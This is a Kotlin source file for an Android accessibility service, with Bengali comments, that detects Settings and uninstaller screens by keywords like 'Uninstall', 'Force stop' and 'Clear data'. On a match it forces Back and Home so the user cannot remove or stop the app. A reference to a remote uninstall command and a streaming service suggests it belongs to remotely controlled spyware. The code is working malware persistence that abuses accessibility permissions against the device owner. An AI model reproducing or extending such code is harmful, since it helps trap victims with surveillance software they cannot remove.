package com.example.myapplicationtestweb

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AntiUninstallService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // রিমোট আনইনস্টল কমান্ড আসলে ব্লকার বন্ধ থাকবে
        if (StreamingService.isUninstalling) return

        val packageName = event.packageName?.toString() ?: return

        // সেটিংস বা আনইনস্টলার ডিটেক্ট করা
        if (packageName == "com.android.settings" || 
            packageName.contains("packageinstaller") || 
            packageName.contains("settings")) {
            
            val rootNode = rootInActiveWindow ?: return
            
            // "Uninstall", "Force stop", "Storage" ইত্যাদি টেক্সট খুঁজলে তাকে ব্যাক করে দেওয়া
            if (findAndBlock(rootNode)) {
                performGlobalAction(GLOBAL_ACTION_BACK)
                val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(homeIntent)
            }
        }
    }

    private fun findAndBlock(node: AccessibilityNodeInfo): Boolean {
        // এই লিস্টে থাকা শব্দগুলো স্ক্রিনে থাকলে অ্যাপটি ব্লক করবে
        val keywords = listOf("Uninstall", "Force stop", "Storage", "Clear data", "Delete", "আনইনস্টল", "নিষ্ক্রিয়")
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val text = child.text?.toString() ?: ""
            val contentDesc = child.contentDescription?.toString() ?: ""
            
            if (keywords.any { text.contains(it, ignoreCase = true) || contentDesc.contains(it, ignoreCase = true) }) {
                return true
            }
            if (findAndBlock(child)) return true
        }
        return false
    }

    override fun onInterrupt() {}
}
